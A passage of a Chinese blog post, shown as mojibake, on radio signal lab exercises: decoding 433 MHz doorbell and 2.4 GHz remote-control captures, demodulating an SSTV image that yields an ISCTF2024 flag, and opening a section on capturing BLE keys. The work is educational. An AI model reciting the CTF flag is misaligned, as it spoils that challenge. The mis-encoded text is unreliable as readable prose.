    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è²Œä¼¼éƒ½æ˜¯æ— çº¿ç”µæ–¹é¢çš„</p><span id="more"></span><hr><h1 id="åˆ©ç”¨gqrxå’Œrtl-433åˆ†æ433MHzé¥æ§é—¨é“ƒä¿¡å·"><a href="#åˆ©ç”¨gqrxå’Œrtl-433åˆ†æ433MHzé¥æ§é—¨é“ƒä¿¡å·" class="headerlink" title="åˆ©ç”¨gqrxå’Œrtl_433åˆ†æ433MHzé¥æ§é—¨é“ƒä¿¡å·"></a>åˆ©ç”¨gqrxå’Œrtl_433åˆ†æ433MHzé¥æ§é—¨é“ƒä¿¡å·</h1><p>æ— çº¿é¥æ§é—¨é“ƒé€šå¸¸å·¥ä½œåœ¨ ISM é¢‘æ®µï¼Œæ¯”å¦‚ 315Mhz, 433Mhz å’Œ868&#x2F;915Mhz</p><p>åœ¨ä¿¡å·è°ƒåˆ¶æ–¹é¢åˆ™ä»¥ OOK&#x2F;ASK&#x2F;FSK ä¸ºä¸»ï¼Œè¿™å‡ ç§è°ƒåˆ¶æ–¹æ¡ˆåº”ç”¨éå¸¸å¹¿æ³›ï¼Œå¦‚æ— çº¿åŸºç«™ï¼Œé¥æ§é’¥åŒ™å’Œèƒå‹ç³»ç»Ÿ TPMS éƒ½æœ‰å®ƒä»¬çš„èº«å½±</p><p>åœ¨æ— çº¿é’¥åŒ™é¢†åŸŸ OOK çš„ç®€å•æ€§æ˜¯å…¶å®ƒè°ƒåˆ¶æ–¹æ¡ˆæ‰€ä¸åŠçš„ï¼Œä»…éœ€è¦å°†è½½æ³¢ä¿¡å·å‘é€åˆ°åŠŸæ”¾å’Œå¤©çº¿ï¼Œå³å¯è¡¨ç° â€œ1â€ æˆ–ä¸å‘å°„ä»»ä½•ä¿¡å·å³ä»£è¡¨ â€œ0â€</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>Gqrxï¼šå¼€æºçš„å›¾å½¢åŒ–è½¯ä»¶å®šä¹‰æ— çº¿ç”µï¼ˆSDRï¼‰æ¥æ”¶å™¨ï¼Œæ”¯æŒé¢‘è°±æ˜¾ç¤ºã€ä¿¡å·è°ƒè°ã€è§£è°ƒå’Œå½•åˆ¶ç­‰åŠŸèƒ½</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gqrx-sdr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>rtl_433ï¼šä¸“é—¨ç”¨äºè§£ç æ¥è‡ª 433 MHz æ— çº¿é¢‘æ®µçš„å„ç§è®¾å¤‡ä¿¡å·ï¼Œå¦‚æ— çº¿æ¸©åº¦è®¡ã€æ°”å‹è®¡ã€é—¨çª—ä¼ æ„Ÿå™¨ç­‰ï¼Œæ”¯æŒå¤šç§ä¿¡å·è§£ç æ–¹å¼ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåè®®åˆ†æã€é¢‘è°±åˆ†æã€è°ƒåˆ¶è§£è°ƒç­‰ï¼Œå¹¿æ³›åº”ç”¨äºç‰©è”ç½‘è®¾å¤‡çš„ä¿¡å·ç ´è§£å’Œæ— çº¿ç”µé€šä¿¡çš„å®éªŒç ”ç©¶</p><h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><p>è§£æä¿¡å·æ–‡ä»¶ï¼Œæ’­æ”¾ä¿¡å·å¹¶æŸ¥çœ‹ä¿¡å·çš„é¢‘è°±å›¾</p><p>å°è¯•è§£è¯»ç»å…¸ 433MHz çš„æ— çº¿é—¨é“ƒä¸­çš„ä¿¡å·ä¿¡æ¯</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>åœ¨ gqrx è½¯ä»¶ä¸­æ’­æ”¾å¹¶æŸ¥çœ‹ä¿¡å·çš„é¢‘è°±å›¾</p><p>è®¾ç½®è®¾å¤‡ç±»å‹ä¸ºother</p><p>Device String å‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">file</span><span class="token operator">=</span>/home/kali/æ¡Œé¢/rev_lab/cap433_200ksps.cf32,freq<span class="token operator">=</span><span class="token number">433920000000</span>,rate<span class="token operator">=</span><span class="token number">200000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Input rate è®¾ç½®ä¸º 200000 ï¼ˆå¯¹åº” 200ksps é‡‡æ ·ç‡ï¼‰</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127174748076.png" alt="image-20241127174748076"></p><p>ç‚¹å‡»æ’­æ”¾æŒ‰é’®ï¼Œå³å¯æŸ¥çœ‹å½•åˆ¶ä¿¡å·æ–‡ä»¶çš„é¢‘è°±ä»¥åŠæ’­æ”¾ä¿¡å·</p><p> <img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127174853730.png" alt="image-20241127174853730"></p></li><li><p>åˆ©ç”¨ rtl_443 å·¥å…·è§£æä¿¡å·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rtl_433 <span class="token parameter variable">-r</span> cap433_200ksps.cf32 <span class="token parameter variable">-A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127212031531.png" alt="image-20241127212031531"></p><p>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€é“¾æ¥ï¼Œå¯ä»¥å…·ä½“åˆ†æä¿¡å·ï¼š</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127212201727.png" alt="image-20241127212201727"></p></li></ol><hr><h1 id="åˆ©ç”¨Universal-Radio-Hackeråˆ†æ2-4Gé¥æ§è½¦ä¿¡å·"><a href="#åˆ©ç”¨Universal-Radio-Hackeråˆ†æ2-4Gé¥æ§è½¦ä¿¡å·" class="headerlink" title="åˆ©ç”¨Universal Radio Hackeråˆ†æ2.4Gé¥æ§è½¦ä¿¡å·"></a>åˆ©ç”¨Universal Radio Hackeråˆ†æ2.4Gé¥æ§è½¦ä¿¡å·</h1><p>é¥æ§è½¦å°è½¦çš„é¥æ§å™¨å¸¸å·¥ä½œåœ¨ 2.4 GHz é¢‘æ®µï¼Œè®¸å¤šæ— çº¿è®¾å¤‡ï¼ˆå¦‚ Wi-Fiã€è“ç‰™ã€æ— çº¿é¼ æ ‡ç­‰ï¼‰ä¹Ÿä½¿ç”¨ 2.4 GHz é¢‘æ®µ</p><h2 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>Universal Radio Hackerï¼ˆç®€ç§° URHï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶å·¥å…·ï¼Œä¸“é—¨ç”¨äºæ— çº¿ç”µä¿¡å·çš„åˆ†æã€è§£ç å’Œç ´è§£ã€‚å®ƒå…è®¸ç”¨æˆ·é€šè¿‡è½¯ä»¶å®šä¹‰æ— çº¿ç”µï¼ˆSDRï¼‰ç¡¬ä»¶ï¼ˆå¦‚ RTL-SDRã€HackRFï¼‰æ•æ‰å’Œåˆ†ææ— çº¿ç”µä¿¡å·ï¼Œæ”¯æŒä»ä½é¢‘åˆ°é«˜é¢‘èŒƒå›´çš„ä¿¡å·æ•è·ã€‚URH æä¾›äº†å›¾å½¢åŒ–ç•Œé¢ï¼Œèƒ½å¤Ÿè¿›è¡Œè¯¦ç»†çš„ä¿¡å·åˆ†æï¼Œå¸®åŠ©ç”¨æˆ·è¯†åˆ«å„ç§æ— çº¿åè®®ï¼ŒåŒ…æ‹¬è°ƒé¢‘ï¼ˆFMï¼‰ã€å¹…åº¦è°ƒåˆ¶ï¼ˆAMï¼‰ã€è°ƒé¢‘è°ƒåˆ¶ï¼ˆFSKï¼‰ã€ASKã€OOK ç­‰å¤šç§è°ƒåˆ¶æ–¹å¼ã€‚å®ƒè¿˜å…è®¸ç”¨æˆ·ä»¥å¯è§†åŒ–çš„æ–¹å¼æŸ¥çœ‹ä¿¡å·æ³¢å½¢ã€é¢‘è°±å›¾å’Œæ°´æ™¶å›¾ï¼Œä»è€Œæ›´å¥½åœ°ç†è§£ä¿¡å·ç‰¹æ€§</p><p>URH å…·æœ‰å¼ºå¤§çš„ä¿¡å·åˆ†æåŠŸèƒ½ï¼Œä¸ä»…å¯ä»¥å½•åˆ¶å’Œæ’­æ”¾ä¿¡å·ï¼Œè¿˜æ”¯æŒä¿¡å·çš„è§£è°ƒå’Œåˆ†æï¼Œè‡ªåŠ¨åŒ–çš„åè®®è§£æåŠŸèƒ½ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿç ´è§£å’Œç†è§£æ— çº¿åè®®ã€‚æ­¤å¤–ï¼ŒURH è¿˜å…è®¸ç”¨æˆ·åœ¨å‘ç°ä¿¡å·ä¹‹åå¯¹å…¶è¿›è¡Œè§£ç ã€é‡æ”¾ï¼Œå¹¶æ ¹æ®éœ€è¦ä¿®æ”¹åè®®å‚æ•°è¿›è¡Œå®éªŒ</p><h2 id="ç›®çš„-1"><a href="#ç›®çš„-1" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><ul><li>è§£è¯»å¹¶åˆ†æ 2.4GHz é¥æ§è½¦çš„ä¿¡å·</li><li>å°è¯•åˆ†æä¿¡å·åè®®çš„æ ¼å¼</li></ul><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>æ‰“å¼€å¹¶åˆ†æä¿¡å·</p><p>ç‚¹å‡»Autodetect parametersæŒ‰é’®ï¼Œå¯ä»¥ç›´æ¥è‡ªåŠ¨åˆ†æä¿¡å·çš„åŸºæœ¬å‚æ•°ä»¥åŠè°ƒåˆ¶ä¿¡æ¯</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144206946.png" alt="image-20241202144206946"></p><p>ä¿¡å·ä¸­çš„è¿™äº›éƒ¨åˆ†æ˜¯ç¯å¢ƒä¸­çš„å™ªå£°å¹²æ‰°ï¼Œå¯ä»¥ç”¨é¼ æ ‡æ»‘åŠ¨é€‰ä¸­åç›´æ¥æŒ‰é”®ç›˜ä¸Šçš„ Delete æŒ‰é’®åˆ é™¤</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144415182.png" alt="image-20241202144415182"></p><p>å¾®è°ƒNoiseéƒ¨åˆ†ï¼Œä½¿å¾—ç²‰çº¢è‰²åŒºåŸŸèƒ½è¦†ç›–æ‰æ‰€æœ‰çš„åº•å™ª</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144745965.png" alt="image-20241202144745965"></p><p>Modulation é€‰æ‹© FSK ï¼Œæ­¤æ—¶å†æ¬¡ç‚¹å‡» Autodetect parameters æŒ‰é’®ï¼Œå³å¯åˆ†æ2.4Gé¥æ§å™¨çš„ä¿¡å·å†…å®¹ï¼š</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144900553.png" alt="image-20241202144900553"></p></li><li><p>å°è¯•åˆ†æåè®®æ ¼å¼</p><p>ç‚¹å‡» Analysis èœå•ï¼Œé€‰æ‹© Analyze Protocol å³ä¼šè‡ªåŠ¨æ‰§è¡Œé’ˆå¯¹åè®®çš„åˆ†æ</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202145247170.png" alt="image-20241202145247170"></p><p>è§‚å¯Ÿåˆ†æçš„ç»“æœï¼Œå¯ä»¥å‘ç°äºŒè¿›åˆ¶ä¸²å¤šä¸ºä»¥ä¸‹æ ¼å¼ï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">00110011 00110010110011 0001111111110110 11010110011 001100110101010011011 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çŒœæµ‹å¯¹åº”çš„æ˜¯æ“æ§å°è½¦çš„æ“ä½œ</p></li></ol><hr><h1 id="åˆ©ç”¨GNU-Radio-Compaionå’Œqsstvè§£è°ƒå«æ˜Ÿä¼ è¾“çš„å›¾åƒ"><a href="#åˆ©ç”¨GNU-Radio-Compaionå’Œqsstvè§£è°ƒå«æ˜Ÿä¼ è¾“çš„å›¾åƒ" class="headerlink" title="åˆ©ç”¨GNU Radio Compaionå’Œqsstvè§£è°ƒå«æ˜Ÿä¼ è¾“çš„å›¾åƒ"></a>åˆ©ç”¨GNU Radio Compaionå’Œqsstvè§£è°ƒå«æ˜Ÿä¼ è¾“çš„å›¾åƒ</h1><p>SSTVæŠ€æœ¯æœ¬èº«æ¯”è¾ƒç®€å•ï¼Œå®ƒä½¿ç”¨æ¨¡æ‹Ÿä¿¡å·å°†å›¾åƒâ€œç¼–ç â€å¹¶é€šè¿‡æ— çº¿ç”µæ³¢ä¼ è¾“ã€‚ä¼ è¾“è¿‡ç¨‹ä¸­çš„å›¾åƒä¼šè¢«åˆ†å‰²æˆå¤šæ¡æ‰«æçº¿ï¼Œæ¯ä¸€æ¡æ‰«æçº¿é€šè¿‡æ— çº¿ç”µä¿¡å·å‘é€ï¼Œå¹¶è¢«åœ°é¢æ¥æ”¶ç«™è§£ç ä¸ºå®Œæ•´çš„å›¾åƒã€‚è¿™ç§æ–¹å¼ä¸éœ€è¦å¤æ‚çš„æ•°å­—æ•°æ®è¿æ¥ï¼Œé€‚åˆåœ¨æ— çº¿ç”µé¢‘æ®µä¸Šä½¿ç”¨ï¼Œå°¤å…¶æ˜¯åƒå¤ªç©ºç«™è¿™ç§è¿œç¦»åœ°é¢çš„åœºæ™¯</p><h2 id="å·¥å…·-2"><a href="#å·¥å…·-2" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>GNU Radio Companion (GRC) æ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶å¼€å‘ç¯å¢ƒï¼Œä¸“ä¸ºä¿¡å·å¤„ç†è€Œè®¾è®¡ï¼Œç‰¹åˆ«æ˜¯åœ¨æ— çº¿é€šä¿¡å’Œæ— çº¿ç”µé¢‘è°±åˆ†ææ–¹é¢ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå›¾å½¢åŒ–ç•Œé¢ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡â€œå—â€æ¥æ„å»ºæ— çº¿ç”µç³»ç»Ÿï¼Œè€Œæ— éœ€ç¼–å†™å¤æ‚çš„ä»£ç ã€‚è¿™äº›â€œå—â€æ˜¯ä¸åŒçš„ä¿¡å·å¤„ç†æ¨¡å—ï¼Œå¦‚æ»¤æ³¢å™¨ã€è°ƒåˆ¶è§£è°ƒå™¨ã€æ”¾å¤§å™¨ç­‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ‹–æ”¾åˆ°å·¥ä½œåŒºï¼Œå¹¶é€šè¿‡è¿æ¥æ¥ç»„æˆä¿¡å·å¤„ç†é“¾ã€‚GNU Radio Companionå¹¿æ³›ç”¨äºè½¯ä»¶å®šä¹‰æ— çº¿ç”µï¼ˆSDRï¼‰åº”ç”¨ä¸­ï¼Œæ”¯æŒå®æ—¶ä¿¡å·å¤„ç†ï¼Œå¯ä»¥ç”¨äºæ•™è‚²ã€ç ”ç©¶å’Œå®é™…çš„é€šä¿¡ç³»ç»Ÿè®¾è®¡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnuradio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>QSSTV æ˜¯ä¸€æ¬¾ä¸“é—¨ç”¨äºæ¥æ”¶å’Œå‘é€ SSTVï¼ˆæ…¢æ‰«æç”µè§†ï¼‰ä¿¡å·çš„è½¯ä»¶ï¼Œé€šå¸¸ç”¨äºä¸šä½™æ— çº¿ç”µé€šä¿¡ã€‚å®ƒèƒ½å¤Ÿé€šè¿‡ç”µè„‘ä¸æ— çº¿ç”µè®¾å¤‡çš„è¿æ¥ï¼Œè§£ç  ISS ç­‰å‘å°„çš„ SSTV ä¿¡å·ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸ºå›¾åƒæ–‡ä»¶ã€‚QSSTVæ”¯æŒå¤šç§å¸¸è§çš„ SSTV æ¨¡å¼ï¼Œå¦‚ Robot 36 å’Œ Martin 1 ç­‰ï¼Œå¹¶èƒ½å°†æ¥æ”¶åˆ°çš„å›¾åƒæ˜¾ç¤ºå‡ºæ¥ã€‚å®ƒä¹Ÿæ˜¯æ— çº¿ç”µçˆ±å¥½è€…å’Œä¸šä½™æ— çº¿ç”µæ“ä½œå‘˜å¸¸ç”¨çš„å·¥å…·ä¹‹ä¸€ï¼Œèƒ½å¤Ÿä¸æ ‡å‡†çš„SSTVå‘å°„å™¨å’Œæ¥æ”¶å™¨å…¼å®¹ï¼Œé€‚ç”¨äºçˆ±å¥½è€…æ•æ‰å’Œåˆ†äº«æ¥è‡ªå¤ªç©ºçš„å›¾åƒ</p><h2 id="ç›®çš„-2"><a href="#ç›®çš„-2" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><ul><li>è§£è°ƒæ¨¡æ‹Ÿçš„å«æ˜Ÿä¿¡å·æ–‡ä»¶</li><li>è§£ç SSTVä¿¡å·ï¼Œå¹¶å°è¯•æå–å…¶ä¸­çš„å›¾åƒ</li></ul><h2 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>åˆ©ç”¨GNU Radioå¯¹ä¿¡å·æºæ–‡ä»¶è¿›è¡ŒFMè§£è°ƒ</p><p>æºæ–‡ä»¶å <code>fm-complex64-sample_rate-48khz-dec_ratio-3_1</code> ä¸­å·²ç»åŒ…å«äº†ä¸€äº›å’Œä¿¡å·æœ‰å…³çš„ä¿¡æ¯</p><ul><li>fmï¼šè°ƒåˆ¶ç±»å‹</li><li>complex64ï¼šä¿¡å·æ•°æ®ç±»å‹</li><li>sample_rate-48khzï¼šé‡‡æ ·ç‡</li><li>dec_ratio-3_1ï¼šæŠ½å–ç‡ï¼ˆåŸå§‹ä¿¡å·ä¸å®é™…æœ‰æ•ˆä¿¡å·ä¹‹æ¯”ï¼Œè¿™é‡Œæ˜¯ 3:1ï¼‰</li></ul></li><li><p>æ‰“å¼€GNU Radioï¼Œæ–°å»ºä¸€ä¸ªé¡¹ç›®æ–‡ä»¶ï¼ŒåŒå‡» samp_rate é€‰é¡¹å¡ï¼Œå°†å€¼æ”¹ä¸º 48000ï¼š</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195538819.png" alt="image-20241202195538819"></p><p>ç‚¹å‡»æœç´¢æŒ‰é’®ï¼Œè¾“å…¥ File Sourceï¼ŒåŒå‡»æœç´¢åˆ°çš„ File Souce é€‰é¡¹å¡</p><p>å°†å‡ºç°çš„æ¨¡å—æ‹–åˆ°æœ€å·¦è¾¹ï¼ŒåŒå‡»ï¼Œåœ¨ File ä¸€æ ä¸­è¾“å…¥ä¿¡å·æ–‡ä»¶çš„è·¯å¾„ï¼ŒRepeat æ”¹ä¸º No</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195724016.png" alt="image-20241202195724016"></p><p>ç»§ç»­æœç´¢ï¼šRational Resamplerï¼Œæ‹–åŠ¨åˆ°Fileæ¨¡å—çš„å³è¾¹</p><p>æ‹–åŠ¨ File çš„ Outï¼Œä¸ Rational Resampler çš„ In ç›¸è¿</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195904525.png" alt="image-20241202195904525"></p><p>ç”¨åŒæ ·çš„æ–¹æ³•æŸ¥æ‰¾å¹¶æ·»åŠ  NBFM Receive æ¨¡å—ï¼Œå¹¶è¿æ¥æµç¨‹å›¾</p><p>åŒå‡» NBFM Receive æ¨¡å—ï¼Œå¡«å†™å‚æ•°ï¼š</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200026828.png" alt="image-20241202200026828"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒAudio Rate æ˜¯é™é‡‡æ ·åçš„é¢‘ç‡ï¼ŒQuadrature Rate æ‰æ˜¯ä¿¡å·çš„åŸå§‹é¢‘ç‡ï¼Œç”±äºæŠ½å–ç‡æ˜¯3:1ï¼Œå› æ­¤éŸ³é¢‘çš„é¢‘ç‡æ˜¯48&#x2F;3&#x3D;16kHz</p><p>ç”¨åŒæ ·çš„æ–¹æ³•æ·»åŠ  Wav File Sink æ¨¡å—ï¼Œå¹¶è¿æ¥</p><p>åŒå‡»ç¼–è¾‘å‚æ•°ï¼ŒFile ä¸€æ å¡«å†™éœ€è¦ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ï¼ŒSample Rate ä¸€æ æ”¹ä¸º int(samp_rate&#x2F;3) æˆ–è€… 16000</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200339633.png" alt="image-20241202200339633"></p><p>ä¿å­˜åï¼Œç‚¹å‡»å³ä¸Šè§’çš„è¿è¡ŒæŒ‰é’®ï¼Œæ¥è¿è¡Œæµç¨‹å›¾</p><p>å‡ ç§’é’Ÿåï¼Œåœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸­å°±å‡ºç°äº† wav æ–‡ä»¶</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200557649.png" alt="image-20241202200557649"></p></li><li><p>åˆ©ç”¨ Audacity æŸ¥çœ‹å¹¶è½¬æ¢è§£è°ƒçš„ä¿¡å·æ–‡ä»¶</p><p>æ‰“å¼€ Audacityï¼Œå¹¶åœ¨ File -&gt; Open å¯¼å…¥åˆšåˆšçš„ wav æ–‡ä»¶</p><p>ç‚¹å‡» File -&gt; Export Audioï¼ŒExport to Computer</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202426601.png" alt="image-20241202202426601"></p></li><li><p>åˆ©ç”¨ qsstv å°†ä¿¡å·ä¸­çš„éŸ³é¢‘è½¬æ¢æˆå›¾ç‰‡</p><p>Options -&gt; Configuration</p><p>Sound é€‰é¡¹å¡ä¸­çš„ Sound Input æ”¹ä¸º From Fileï¼Œç‚¹å‡»OKä¿å­˜</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202656527.png" alt="image-20241202202656527"></p><p>åœ¨ Receive é€‰é¡¹å¡ä¸­ï¼Œç‚¹å‡»æ’­æ”¾æŒ‰é’®ï¼Œé€‰æ‹©åˆšåˆš Audacity å¯¼å‡ºçš„ wav æ–‡ä»¶</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202722020.png" alt="image-20241202202722020"></p><p>å³ä¼šè‡ªåŠ¨å¯¹åˆšåˆšçš„ wav æ–‡ä»¶ä¸­çš„éŸ³é¢‘è¿›è¡Œ SSTV è§£ç </p></li><li><p>æ­¤å›¾ç‰‡åœ¨ ISCTF2024 ä¸­äº¦æœ‰è®°è½½</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢æ˜¯è¢«æ‹†äº†çš„äºŒç»´ç ç‚¹é˜µï¼Œç¼ºäº†ä¸€è§’æ˜¯å®šä½ç‚¹</p><p>ç›´æ¥å» QRazybox æ‰‹åŠ¨ä¿®å¤ï¼š<a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a></p><p>æ³¨æ„å°ºå¯¸æ˜¯29*29</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202210730691.png" alt="image-20241202210730691"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202210827890.png" alt="image-20241202210827890"></p><p>å¾—åˆ°flagï¼š<code>ISCTF&#123;Th3_ROmaNtic_Of_Rad1o&#125;</code></p></li></ol><hr><h1 id="åˆ†æä½åŠŸè€—è“ç‰™è®¾å¤‡çš„BLEæ•°æ®åŒ…è·å–æ™ºèƒ½è®¾å¤‡BLEé€šä¿¡å¯†é’¥"><a href="#åˆ†æä½åŠŸè€—è“ç‰™è®¾å¤‡çš„BLEæ•°æ®åŒ…è·å–æ™ºèƒ½è®¾å¤‡BLEé€šä¿¡å¯†é’¥" class="headerlink" title="åˆ†æä½åŠŸè€—è“ç‰™è®¾å¤‡çš„BLEæ•°æ®åŒ…è·å–æ™ºèƒ½è®¾å¤‡BLEé€šä¿¡å¯†é’¥"></a>åˆ†æä½åŠŸè€—è“ç‰™è®¾å¤‡çš„BLEæ•°æ®åŒ…è·å–æ™ºèƒ½è®¾å¤‡BLEé€šä¿¡å¯†é’¥</h1><p>IOT ä¸­ï¼Œä½åŠŸè€—è“ç‰™åè®®ï¼ˆBLEï¼‰å¹¿æ³›åº”ç”¨äºæ™ºèƒ½è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ï¼Œå¦‚æ™ºèƒ½æ‰‹è¡¨ã€æ™ºèƒ½å®¶å±…è®¾å¤‡ã€æ— çº¿è€³æœºç­‰</p><p>BLEï¼ˆBluetooth Low Energyï¼‰åè®®é‡‡ç”¨ä¸»ä»æ¶æ„ï¼Œé€šå¸¸ç”±ä¸€ä¸ªâ€œä¸»è®¾å¤‡â€å’Œå¤šä¸ªâ€œä»è®¾å¤‡â€ç»„æˆï¼Œæ”¯æŒå¤šç§æ“ä½œæ¨¡å¼ä»¥ç¡®ä¿é«˜æ•ˆå’Œä½èƒ½è€—é€šä¿¡ï¼Œåè®®çš„å¸¸è§æ“ä½œï¼š</p><ul><li>å¹¿æ’­ï¼ˆAdvertisingï¼‰ï¼šBLEè®¾å¤‡é€šè¿‡å¹¿æ’­æ•°æ®åŒ…æ¥é€šçŸ¥å‘¨å›´çš„è®¾å¤‡å…¶å­˜åœ¨ï¼Œè¿™äº›å¹¿æ’­æ•°æ®åŒ…ä¸éœ€è¦ä¸å…¶ä»–è®¾å¤‡å»ºç«‹è¿æ¥ï¼Œå› æ­¤è¢«ç§°ä¸ºæ— è¿æ¥å¹¿æ’­ã€‚å¹¿æ’­æ•°æ®åŒ…å¯ä»¥åŒ…å«è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€æœåŠ¡UUIDï¼ˆæœåŠ¡æ ‡è¯†ç¬¦ï¼‰ã€åˆ¶é€ å•†ä¿¡æ¯ç­‰ã€‚å¹¿æ’­æ“ä½œé€šå¸¸ç”¨äºå‘ç°è®¾å¤‡ã€è·å–è®¾å¤‡ä¿¡æ¯æˆ–å¯åŠ¨é…å¯¹è¿‡ç¨‹<ul><li>å¹¿å‘ŠåŒ…ç»“æ„ï¼šå¹¿å‘ŠåŒ…ï¼ˆAdvertising Packetï¼‰é€šå¸¸åŒ…å«ä¸€ä¸ªè®¾å¤‡åœ°å€ã€å¹¿æ’­æ•°æ®ã€å¹¿å‘Šé—´éš”ç­‰ä¿¡æ¯ã€‚å¹¿å‘Šé—´éš”æ˜¯æŒ‡BLEè®¾å¤‡å‘é€å¹¿å‘Šæ•°æ®åŒ…çš„é¢‘ç‡</li></ul></li><li>æ‰«æï¼ˆScanningï¼‰ï¼šBLEè®¾å¤‡å¯ä»¥é€šè¿‡æ‰«ææ¥æ¥æ”¶å…¶ä»–è®¾å¤‡çš„å¹¿æ’­æ•°æ®åŒ…ã€‚æ‰«æåˆ†ä¸ºä¸»åŠ¨æ‰«æå’Œè¢«åŠ¨æ‰«æä¸¤ç§æ–¹å¼ã€‚ä¸»åŠ¨æ‰«ææ—¶ï¼Œè®¾å¤‡ä¼šä¸»åŠ¨å‘å¹¿æ’­è®¾å¤‡å‘é€æ‰«æè¯·æ±‚ï¼Œä»è€Œè·å–æ›´å¤šçš„ä¿¡æ¯ï¼›è€Œè¢«åŠ¨æ‰«ææ—¶ï¼Œè®¾å¤‡ä»…æ¥æ”¶å¹¿æ’­æ•°æ®åŒ…ã€‚</li><li>è¿æ¥ï¼ˆConnectionï¼‰ï¼šè¿æ¥æ˜¯BLEè®¾å¤‡é—´è¿›è¡Œé€šä¿¡çš„åŸºç¡€ã€‚ä¸€æ—¦BLEè®¾å¤‡é€šè¿‡å¹¿æ’­å‘ç°äº†ç›®æ ‡è®¾å¤‡å¹¶å®Œæˆäº†é…å¯¹æˆ–é…å¯¹åå»ºç«‹äº†è¿æ¥ï¼Œè®¾å¤‡å°±å¯ä»¥äº¤æ¢æ•°æ®ã€‚BLEè¿æ¥é€šè¿‡è¿æ¥è¯·æ±‚ï¼ˆConnection Requestï¼‰å’Œè¿æ¥å“åº”ï¼ˆConnection 